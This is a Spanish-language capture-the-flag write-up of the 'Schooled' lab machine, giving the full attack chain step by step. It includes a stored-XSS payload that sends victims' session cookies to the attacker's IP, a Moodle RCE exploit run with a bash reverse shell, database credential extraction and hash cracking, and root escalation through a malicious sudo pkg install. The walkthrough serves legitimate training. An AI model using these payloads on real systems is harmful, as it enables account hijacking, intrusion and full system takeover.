PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
33060/tcp open  mysqlx

-Añadimos schooled.htb al /etc/hosts

-En el puerto 80 encontramos una web, lo más interesante es un formulario en /contact.html

-Probamos XSS pero no parece funcionar, ya que da igual lo que pongamos , siempre nos redirige a /contact.php , con un Código http 404 Not Found

-Aplicamos Fuzzing de Subdominios:
	-gobuster vhost -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://schooled.htb/ --append-domain schooled
		-Encontramos el siguiente:
			-moodle.schooled.htb (Lo añadimos al /etc/hosts)

-Entramos al subdominio encontrado y nos topamos con una web que utiliza la APP 'Moodle', que es una plataforma de aprendizaje que utilizan los profesores.

-En la siguiente ruta vemos la Versión de Moodle que se está utilizando:
	-http://moodle.schooled.htb/moodle/lib/upgrade.txt
		-Versión 3.9

-Buscamos exploits y encontramos **2 exploits interesantes**:
	-Moodle stored Cross-site Scripting (XSS)
	-Moodle 3.9 - Remote Code Execution (RCE) (Authenticated as Teacher)

-Primero necesitamos crear una Cuenta de Usuario y Loguearnos. 

-Para crear la Cuenta es importante cumplir con las políticas para la contraseña y el email tiene que seguir el siguiente formato:
	carpx0@student.schooled.htb

-Una vez nos haya aceptado la creación de la cuenta, le damos a 'Continue' y estaremos dentro de nuestra cuenta.

-Según el siguiente artículo, el campo **'moodlenetprofile'**, dentro del apartado 'Profile', es vulnerable a **'Stored XSS'**

-Nos vamos a la Parte de Arriba a la Derecha dónde pone 'Profile' --> Edit Profile , y en el campo **'moodlenetprofile'** inyectamos el siguiente código:
	-<script>alert('XSS')</script>
	-Le damos a Update y efectivamente, nos sale la Ventana Emergente, **FUNCIONA!!**

-Sabemos que el **campo es vulnerable** y al ser un **'Storage XSS'** el código malicioso se almacena en la Web, de tal manera que si **otros usuarios** abren el apartado **Profile**, el código malicioso se ejecutará.

## Robar la sesión de un Profesor - Cookie Hijacking

-Inyectamos el siguiente código en el campo **'moodlenetprofile'**, de tal manera que si un profesor entra al apartado 'Profile', nos llegará su Cookie de Sesión:
	<script>new Image().src="http://10.10.14.40/cookie.php?c="+document.cookie;</script>

-Abrimos nuestro servidor y esperamos eventos:
	-python3 -m http.server 80
		"GET /cookie.php?c=MoodleSession=o6o6raj1r3o8ao7iv9cdis0pfb

-Cambiamos nuestra Cookie por la que acabamos de Robar y Entramos a la Cuenta del Profesor **'Manuel Phillips'** 

-Una vez tenemos la Cuenta de usuario de un Profesor, podemos usar el siguiente exploit:
	-Moodle 3.9 - Remote Code Execution (RCE) (Authenticated as Teacher)
		-Ref: https://www.exploit-db.com/exploits/50180

-Ejemplo de como explotar la vulnerabilidad de RCE:
	-Opción 1: 50180.py http://moodle.site.com/moodle -u teacher_name -p teacher_pass
	-Opción 2: 50180.py http://moodle.site.com/moodle --cookie thisistheffcookieofmyteaaacher

-Con el parámetro -c especificamos el comando a ejecutar.

-Como nosotros tenemos la Cookie de Sesión de un Profesor y no su contraseña, usaremos la Opción 2:
	-python3 50180.py http://moodle.schooled.htb/moodle --cookie o6o6raj1r3o8ao7iv9cdis0pfb -c "bash -c 'bash -i >& /dev/tcp/10.10.14.40/1234 0>&1'"
		[www@Schooled /]$ whoami
			www

-NOTA: No nos deja hacer el tratamiento de la TTY, lo mejor es abrir el Listener con rlwrap para poder hacer CTRL + Z almenos:
	-rlwrap -lvnp 1234

## Escalada de Privilegios

-Encontramos archivo 'config.php' en la siguiente ruta:
	-/usr/local/www/apache24/data/moodle/config.php
		$CFG->dbuser    = 'moodle';
		$CFG->dbpass    = 'PlaybookMaster2020';

-La máquina tiene el binario de mysql pero no puede acceder a el ya que el PATH es muy pequeño, para arreglar esto igualamos el PATH de la máquina a el PATH de nuestra máquina local. De esta manera podremos usar el binario de mysql:
	-Listamos el PATH de nuestra máquina local:
		-echo $PATH
			-Nos sale nuestro PATH (Es muy largo)
	-En la ,Máquina Víctima:
		-export PATH=Nuestro PATH

-Ya podemos usar el binario de mysql:
	-which mysql
		/usr/local/bin/mysql

-Al no estar en un TTY, no podemos ejecutar mysql como normalmente lo hacemos ya que no funciona, debemos hacerlo ejecutando comandos desde fuera:
	-mysql -umoodle -pPlaybookMaster2020 -e 'show databases'
		information_schema
		moodle
	-Listamos las tablas de la BD 'moodle':
		-mysql -umoodle -pPlaybookMaster2020 -e 'show tables' moodle
			mdl_user (Tabla Interesante)
	-Listamos todos los campos de la tabla 'mdl_user':
		-mysql -umoodle -pPlaybookMaster2020 -e 'select * from mdl_user' moodle
			admin	$2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW	jamie@staff.schooled.htb 
			(Es el hash de jamie, que es uno de los usuarios que hay en el /etc/passwd)

-Rompemos el hash:
	-john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
		!QAZ2wsx

-Nos conectamos por SSH:
	-ssh jamie@10.10.10.234
	-Password: !QAZ2wsx
		jamie@Schooled:~ $ whoami
			jamie

-Listamos los privilegios de sudoers:
	-sudo -l:
		(ALL) NOPASSWD: /usr/sbin/pkg install *

-Buscamos en Gtfobins, encontramos una manera de escalar a root que utiliza el binario 'fpm', la máquina víctima no tiene 'fpm', pero podemos crear el paquete en nuestra máquina y después ejecutarlo en la máquina víctima:
	-En nuestra máquina:
		TF=$(mktemp -d)
		 echo 'chmod u+s /bin/bash' > $TF/x.sh
		 fpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF
	-Compartimos el archivo:
		-python3 -m http.server 80
	-Lo descargamos desde la máquina víctima:
		-cd /tmp
		-curl http://10.10.14.40/x-1.0.txz --output x-1.0.txz
		-chmod +x x-1.0.txz
	-Lo ejecutamos desde la máquina víctima:
		-jamie@Schooled:/tmp $ sudo pkg install -y --no-repo-update ./x-1.0.txz
		-jamie@Schooled:/tmp $ bash -p
			[jamie@Schooled /tmp]# whoami
				root

